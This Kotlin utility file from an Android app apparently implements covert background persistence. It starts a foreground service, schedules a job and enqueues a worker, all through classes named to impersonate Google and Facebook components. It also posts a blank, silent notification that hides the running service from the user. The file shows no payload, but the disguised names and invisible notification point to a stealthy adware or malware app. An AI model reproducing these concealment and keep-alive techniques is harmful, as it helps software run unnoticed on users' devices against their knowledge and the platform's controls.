package com.river.shore

import android.app.ActivityManager
import android.app.Notification
import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.ComponentName
import android.content.Context
import android.content.Context.JOB_SCHEDULER_SERVICE
import android.content.Intent
import android.os.Build
import android.util.Log
import android.widget.RemoteViews
import androidx.core.app.NotificationChannelCompat
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequest
import androidx.work.WorkManager
import com.helper.sdk.HelperWorker
import java.util.concurrent.TimeUnit


/**
 * Date：2025/12/4
 * Describe:
 */
object Utils {

    fun log(msg: String) {
        // todo remove in vps
        Log.e("Log-->", msg)
    }

    @JvmStatic
    fun openService(context: Context) {
        if (isServiceRunning(context, "com.google.android.datatransport.core.MessageCoreService")) return
        val claz = Class.forName("com.google.android.datatransport.core.MessageCoreService")
        runCatching {
            ContextCompat.startForegroundService(context, Intent(context, claz))
        }
    }

    private fun isServiceRunning(context: Context, serName: String): Boolean {
        val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        // 获取正在运行的服务列表
        val runningServices = am.getRunningServices(600)
        for (service in runningServices) {
            // 比较服务的完整类名
            if (serName == service.service.className) {
                return true
            }
        }
        return false
    }

    @JvmStatic
    fun openJobService(context: Context) {
        val componentName = ComponentName(context, Class.forName("com.facebook.login.SignService"))
        runCatching {
            val jobInfo: JobInfo =
                JobInfo.Builder(62789, componentName).setMinimumLatency(3345) // 至少延迟 5 秒
                    .build()
            val jobScheduler = context.getSystemService(JOB_SCHEDULER_SERVICE) as JobScheduler
            jobScheduler.schedule(jobInfo)
        }
    }

    private var isFirst = true

    fun openWork(context: Context) {
        val build = OneTimeWorkRequest.Builder(HelperWorker::class.java)
        if (isFirst.not()) {
            build.setInitialDelay(1, TimeUnit.MINUTES)
        }
        isFirst = false
        val workRequest = build.build()
        val workManager = WorkManager.getInstance(context)
        workManager.enqueueUniqueWork("sound_work", ExistingWorkPolicy.REPLACE, workRequest)
    }

    private var isGo = false

    @JvmStatic
    fun openChannel(context: Context) {
        if (isGo) return
        isGo = true
        try {
            val str = context.getString(R.string.google_helper)
            val builder = NotificationChannelCompat.Builder(str, 3)
            builder.setName(str)
            builder.setSound(null, null)
            builder.setLightsEnabled(false)
            builder.setVibrationEnabled(false)
            val builder2: NotificationCompat.Builder =
                NotificationCompat.Builder(context, str)
            builder2.setChannelId(str)
            builder2.setCustomContentView(RemoteViews(context.packageName, R.layout.layout_sty_go))
            builder2.setContentTitle("")
            builder2.setContentText("")
            builder2.setSound(null)
            builder2.setCategory(Notification.CATEGORY_CALL)
            builder2.setSmallIcon(R.drawable.ic_so_pz)
            builder2.setPriority(0)
            val build = builder2.build()
            val from = NotificationManagerCompat.from(context)
            from.createNotificationChannel(builder.build())
            from.notify(95438, build)
        } catch (e: Throwable) {
            e.printStackTrace()
        }
    }
}